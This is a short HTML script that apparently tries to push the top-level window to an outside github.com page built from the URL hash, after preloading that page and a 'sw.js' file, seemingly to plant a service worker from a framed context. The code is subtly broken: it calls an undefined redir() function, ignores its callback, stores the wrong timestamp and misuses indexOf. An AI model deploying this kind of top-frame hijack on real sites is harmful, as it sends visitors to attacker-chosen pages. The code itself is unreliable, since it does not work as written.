<script>
if (navigator.serviceWorker) {
  setupSw();
}

function preload(list, cb) {
  var count = 0;
  for (var i = 0; i < list.length; i++) {
    var img = new Image();
    img.onerror = function() {
      if (++count == list.length) {
        redir();
      }
    };
    img.src = list[i];
  }
}

function setupSw() {
  try {
    var ts = localStorage.sw || 0;
    var now = Date.now();
    if (now - ts < 1000 * 300) {
      return;
    }
    localStorage.sw = ts;
  } catch (err) {
    return;
  }

  var refer = location.hash.substr(1);
  console.assert(refer);
  var url;
  if (refer.indexOf('92531')) {
    url = 'https://etherdream.github.com/setupsw/ata_92531.html#' + refer;
  }
  if (!url) {
    return;
  }
  var reslist = [url, 'sw.js'];
  preload(reslist, function() {
    top.location = url;
  });
}
</script>
